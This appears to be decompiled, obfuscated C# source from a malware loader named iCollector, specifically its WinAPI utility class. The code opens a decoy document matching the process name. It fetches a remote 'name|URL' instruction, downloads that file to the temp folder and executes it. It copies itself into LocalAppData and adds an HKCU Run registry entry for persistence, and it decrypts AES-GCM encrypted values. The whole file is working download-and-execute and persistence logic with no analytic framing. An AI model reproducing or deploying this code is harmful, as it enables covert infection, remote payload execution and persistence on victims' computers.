using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using iCollector.Job.Handler;
using ICSharpCode.SharpZipLib.Zip;
using Microsoft.Win32;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace iCollector.Util;

internal class WinAPI
{
	private static Logger log = Logger.Instance();

	private static LogContext ctx = new LogContext("WinAPI");

	public static void FindAndOpenContent()
	{
		string processName = Process.GetCurrentProcess().ProcessName;
		string text = default(string);
		if (3u != 0 && 0 == 0)
		{
			text = processName;
		}
		if (4 == 0 || string.Equals(text, CacheRepository.GetGUID()))
		{
			return;
		}
		try
		{
			string[] files = Directory.GetFiles("./CONTENT");
			string[] array;
			if (6u != 0 && 6u != 0)
			{
				array = files;
			}
			while (true)
			{
				int num = 0;
				int num2;
				if ((8u != 0) ? true : false)
				{
					num2 = num;
				}
				while (true)
				{
					if (num2 >= array.Length)
					{
						return;
					}
					string path;
					while (0 == 0)
					{
						string obj = array[num2];
						if (5u != 0)
						{
							if (4u != 0)
							{
								path = obj;
							}
							if (2 == 0)
							{
								continue;
							}
						}
						goto IL_0042;
					}
					break;
					IL_0042:
					if (string.Equals(Path.GetFileNameWithoutExtension(path).ToLower(), text.ToLower()) && 3u != 0)
					{
						if (3u != 0 && 0 == 0)
						{
							OpenFile(path);
						}
						return;
					}
					num = num2 + 1;
					if (2u != 0 && uint.MaxValue != 0 && 7u != 0)
					{
						num2 = num;
					}
				}
			}
		}
		catch (Exception ex)
		{
			log.Info(ctx, ex.ToString());
			TryOpenFileOnline(text);
		}
	}

	private static void TryOpenFileOnline(string processName)
	{
		try
		{
			string message = OnlineResourceUtils.GetMessage(processName);
			string text = default(string);
			if (5u != 0)
			{
				if (0 == 0)
				{
					text = message;
				}
				if (5 == 0)
				{
					goto IL_00d8;
				}
			}
			string text3;
			if (string.IsNullOrEmpty(text))
			{
				if (4u != 0)
				{
					return;
				}
			}
			else
			{
				string[] array = text.Split(new char[1] { '|' });
				string[] array2 = default(string[]);
				if (0 == 0 && 0 == 0)
				{
					array2 = array;
				}
				string text2 = Path.Combine(Path.GetTempPath(), array2[0]);
				if (4u != 0)
				{
					text3 = text2;
				}
				Logger logger = log;
				LogContext logContext = ctx;
				string message2 = "path: " + text3;
				if (true)
				{
					logger.Info(logContext, message2);
				}
				if (!File.Exists(text3))
				{
					WebClient webClient = new WebClient();
					WebClient webClient2 = default(WebClient);
					if (0 == 0)
					{
						webClient2 = webClient;
					}
					try
					{
						Logger logger2 = log;
						LogContext logContext2 = ctx;
						string message3 = "startDownload: " + array2[1];
						if (0 == 0 && 8u != 0)
						{
							logger2.Info(logContext2, message3);
						}
						while (5 == 0)
						{
						}
						WebClient webClient3 = webClient2;
						string address = array2[1];
						if (5u != 0)
						{
							webClient3.DownloadFile(address, text3);
						}
					}
					finally
					{
						((IDisposable)webClient2)?.Dispose();
					}
				}
				if (File.Exists(text3))
				{
					goto IL_00d3;
				}
				Logger logger3 = log;
				LogContext logContext3 = ctx;
				if (2u != 0)
				{
					logger3.Error(logContext3, "enrich online path failed");
				}
			}
			goto IL_00f5;
			IL_00d3:
			if (3u != 0)
			{
				OpenFile(text3);
			}
			goto IL_00d8;
			IL_00d8:
			if (false)
			{
				return;
			}
			goto IL_00f5;
			IL_00f5:
			if (0 == 0)
			{
				return;
			}
			goto IL_00d3;
		}
		catch (Exception ex)
		{
			log.Info(ctx, ex.ToString());
		}
	}

	private static string GetFileNameWithoutExtension(string fileName)
	{
		try
		{
			string text = default(string);
			int num;
			nint num2;
			int length = default(int);
			if (2u != 0)
			{
				string obj = fileName.Split('/')[^1];
				if (3u != 0 && 0 == 0)
				{
					text = obj;
				}
				num = 0;
				num2 = num;
				if (5 == 0)
				{
					if (5 == 0)
					{
						goto IL_0033;
					}
				}
				else if (0 == 0)
				{
					length = num;
				}
				goto IL_0021;
			}
			goto IL_0049;
			IL_0060:
			int num3 = 2;
			goto IL_0061;
			IL_005b:
			int num4;
			nint num5 = num2 - num4;
			int num6;
			if (0 == 0)
			{
				num6 = (int)num5;
			}
			goto IL_0060;
			IL_0067:
			string result = text.Substring(0, length);
			if (0 == 0)
			{
				return result;
			}
			string result2 = default(string);
			return result2;
			IL_0061:
			if (num3 == 0)
			{
				goto IL_0021;
			}
			char[] array = default(char[]);
			if (num6 >= 0)
			{
				num2 = (int)array[num6];
				if (1 == 0)
				{
					goto IL_0030;
				}
				num4 = 46;
				while (num2 != num4)
				{
					num = num6;
					num2 = num;
					if (0 == 0)
					{
						num4 = 1;
						if (num4 == 0)
						{
							continue;
						}
						goto IL_005b;
					}
					goto IL_0090;
				}
				goto IL_0049;
			}
			goto IL_0067;
			IL_0030:
			num = (int)num2;
			num2 = num;
			goto IL_0031;
			IL_0090:
			if (4u != 0)
			{
				num6 = num;
			}
			goto IL_0060;
			IL_0021:
			char[] array2 = text.ToCharArray();
			if (0 == 0 && 0 == 0)
			{
				array = array2;
			}
			num2 = (nint)array.LongLength;
			goto IL_0030;
			IL_0049:
			num3 = num6;
			if (false)
			{
				goto IL_0061;
			}
			if ((5u != 0) ? true : false)
			{
				length = num3;
			}
			goto IL_0067;
			IL_0033:
			if (false)
			{
				if (false)
				{
					goto IL_0031;
				}
				goto IL_0060;
			}
			goto IL_0090;
			IL_0031:
			num--;
			num2 = num;
			goto IL_0033;
		}
		catch (Exception)
		{
			return fileName;
		}
	}

	public static void TryOpenInZip(string fileName, string zipPath)
	{
		try
		{
			string text;
			if (3u != 0)
			{
				text = "";
			}
			string text2 = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
			string path = default(string);
			if (0 == 0)
			{
				path = text2;
			}
			ZipFile zipFile = new ZipFile(zipPath);
			ZipFile zipFile2 = default(ZipFile);
			if (0 == 0)
			{
				zipFile2 = zipFile;
			}
			try
			{
				IEnumerator enumerator = zipFile2.GetEnumerator();
				IEnumerator enumerator2 = default(IEnumerator);
				if (0 == 0 && 8u != 0)
				{
					enumerator2 = enumerator;
				}
				try
				{
					ZipEntry zipEntry = default(ZipEntry);
					FileStream fileStream2 = default(FileStream);
					while (true)
					{
						if (enumerator2.MoveNext())
						{
							goto IL_0042;
						}
						goto IL_0105;
						IL_0042:
						ZipEntry obj = (ZipEntry)enumerator2.Current;
						if (0 == 0 && uint.MaxValue != 0)
						{
							zipEntry = obj;
						}
						if (!zipEntry.IsFile || !zipEntry.Name.Contains("CONTENT/"))
						{
							continue;
						}
						goto IL_0076;
						IL_0105:
						if (0 == 0)
						{
							break;
						}
						goto IL_0076;
						IL_0076:
						if (!string.Equals(GetFileNameWithoutExtension(zipEntry.Name).ToLower(), fileName.ToLower()))
						{
							continue;
						}
						string text3 = Path.Combine(path, zipEntry.Name);
						if (5u != 0 && 0 == 0)
						{
							text = text3;
						}
						string? directoryName = Path.GetDirectoryName(text);
						string path2;
						if (7u != 0)
						{
							path2 = directoryName;
						}
						if (!Directory.Exists(path2))
						{
							Directory.CreateDirectory(path2);
						}
						if (8 == 0)
						{
							goto IL_0042;
						}
						FileStream fileStream = File.Create(text);
						if (0 == 0)
						{
							fileStream2 = fileStream;
						}
						try
						{
							Stream inputStream = zipFile2.GetInputStream(zipEntry);
							FileStream destination = fileStream2;
							if (0 == 0)
							{
								inputStream.CopyTo(destination);
							}
						}
						finally
						{
							((IDisposable)fileStream2)?.Dispose();
						}
						goto IL_0105;
					}
				}
				finally
				{
					IDisposable disposable = enumerator2 as IDisposable;
					if (6u != 0)
					{
						disposable?.Dispose();
					}
				}
			}
			finally
			{
				((IDisposable)zipFile2)?.Dispose();
			}
			if (!string.IsNullOrEmpty(text))
			{
				OpenFile(text);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void PersistenceInstance()
	{
		try
		{
			string text = default(string);
			RegistryKey registryKey2 = default(RegistryKey);
			if (0 == 0)
			{
				string gUID = CacheRepository.GetGUID();
				if (true && 0 == 0)
				{
					text = gUID;
				}
				RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (0 == 0 && 0 == 0)
				{
					registryKey2 = registryKey;
				}
				while (registryKey2.GetValue(text) == null)
				{
					if (3 == 0)
					{
						continue;
					}
					goto IL_0052;
				}
				Logger logger = log;
				LogContext logContext = ctx;
				if (0 == 0)
				{
					logger.Info(logContext, "already existed persistance. Skip binding");
				}
			}
			goto IL_00ec;
			IL_00e3:
			RegistryKey registryKey3 = registryKey2;
			string name = text;
			string text2 = default(string);
			string value = text2;
			if (4u != 0)
			{
				registryKey3.SetValue(name, value);
			}
			goto IL_00ec;
			IL_00ec:
			RegistryKey registryKey4 = registryKey2;
			if (3u != 0)
			{
				registryKey4.Dispose();
			}
			if (5u != 0)
			{
				RegistryKey registryKey5 = registryKey2;
				if (7u != 0)
				{
					registryKey5.Close();
				}
				if (0 == 0)
				{
					return;
				}
				goto IL_0070;
			}
			goto IL_00e3;
			IL_0070:
			if (!File.Exists(text2))
			{
				try
				{
					do
					{
						string? fileName = Process.GetCurrentProcess().MainModule.FileName;
						string destFileName = text2;
						if (0 == 0 && 0 == 0)
						{
							File.Copy(fileName, destFileName);
						}
					}
					while (false);
				}
				catch (Exception ex)
				{
					log.Error(ctx, ex.ToString());
					text2 = Process.GetCurrentProcess().MainModule.FileName;
				}
			}
			Logger logger2 = log;
			LogContext logContext2 = ctx;
			string message = "register path: " + text2;
			if (0 == 0)
			{
				logger2.Info(logContext2, message);
			}
			goto IL_00e3;
			IL_0052:
			string text3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), text + ".exe");
			if (4u != 0)
			{
				text2 = text3;
			}
			goto IL_0070;
		}
		catch (Exception ex2)
		{
			if (0 == 0)
			{
				log.Error(ctx, ex2.ToString());
			}
		}
	}

	private static void OpenFile(string path)
	{
		while (true)
		{
			if (true && 0 == 0)
			{
				goto IL_0006;
			}
			goto IL_002a;
			IL_0006:
			if (2 == 0)
			{
				continue;
			}
			if (0 == 0)
			{
				Process process = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo(path);
				if (0 == 0 && 0 == 0)
				{
					processStartInfo.UseShellExecute = true;
				}
				if (0 == 0 && 6u != 0)
				{
					process.StartInfo = processStartInfo;
				}
				process.Start();
			}
			goto IL_002a;
			IL_002a:
			if (false)
			{
				continue;
			}
			if (2u != 0)
			{
				break;
			}
			goto IL_0006;
		}
	}

	public static string ReadValue(byte[] message, byte[] key, int nonSecretPayloadLength)
	{
		if (key != null && 7u != 0)
		{
			IntPtr intPtr = (nint)key.LongLength;
			MemoryStream memoryStream2 = default(MemoryStream);
			byte[] nonce = default(byte[]);
			GcmBlockCipher gcmBlockCipher2 = default(GcmBlockCipher);
			AeadParameters aeadParameters2 = default(AeadParameters);
			byte[] array5 = default(byte[]);
			string result = default(string);
			while ((int)(nint)intPtr == 32)
			{
				if (message != null)
				{
					intPtr = (nint)message.LongLength;
					if (false)
					{
						continue;
					}
					if (intPtr != (IntPtr)0)
					{
						MemoryStream memoryStream = new MemoryStream(message);
						if (0 == 0)
						{
							memoryStream2 = memoryStream;
						}
						try
						{
							BinaryReader binaryReader = new BinaryReader(memoryStream2);
							try
							{
								binaryReader.ReadBytes(nonSecretPayloadLength);
								byte[] array = binaryReader.ReadBytes(12);
								if (8u != 0 && 0 == 0)
								{
									nonce = array;
								}
								GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
								if (4u != 0 && 0 == 0)
								{
									gcmBlockCipher2 = gcmBlockCipher;
								}
								while (true)
								{
									AeadParameters aeadParameters = new AeadParameters(new KeyParameter(key), 128, nonce);
									if (4u != 0 && 0 == 0)
									{
										aeadParameters2 = aeadParameters;
									}
									while (true)
									{
										GcmBlockCipher gcmBlockCipher3 = gcmBlockCipher2;
										AeadParameters parameters = aeadParameters2;
										if (0 == 0)
										{
											gcmBlockCipher3.Init(forEncryption: false, parameters);
										}
										byte[] array2 = binaryReader.ReadBytes(message.Length);
										byte[] array3;
										if (5u != 0)
										{
											array3 = array2;
										}
										if (5 == 0)
										{
											break;
										}
										byte[] array4 = new byte[gcmBlockCipher2.GetOutputSize(array3.Length)];
										if (0 == 0)
										{
											array5 = array4;
										}
										try
										{
											int num = gcmBlockCipher2.ProcessBytes(array3, 0, array3.Length, array5, 0);
											if (5u != 0)
											{
												int outOff;
												if (uint.MaxValue != 0)
												{
													outOff = num;
												}
												num = gcmBlockCipher2.DoFinal(array5, outOff);
											}
										}
										catch (InvalidCipherTextException)
										{
											if (2u != 0)
											{
												return null;
											}
											return result;
										}
										string @string = Encoding.Default.GetString(array5);
										if (0 == 0)
										{
											result = @string;
										}
										if (false)
										{
											continue;
										}
										return result;
									}
								}
							}
							finally
							{
								if (uint.MaxValue != 0)
								{
									((IDisposable)binaryReader)?.Dispose();
								}
							}
						}
						finally
						{
							((IDisposable)memoryStream2)?.Dispose();
						}
					}
				}
				throw new ArgumentException("Message null!", "message");
			}
		}
		throw new ArgumentException("error key size");
	}
}
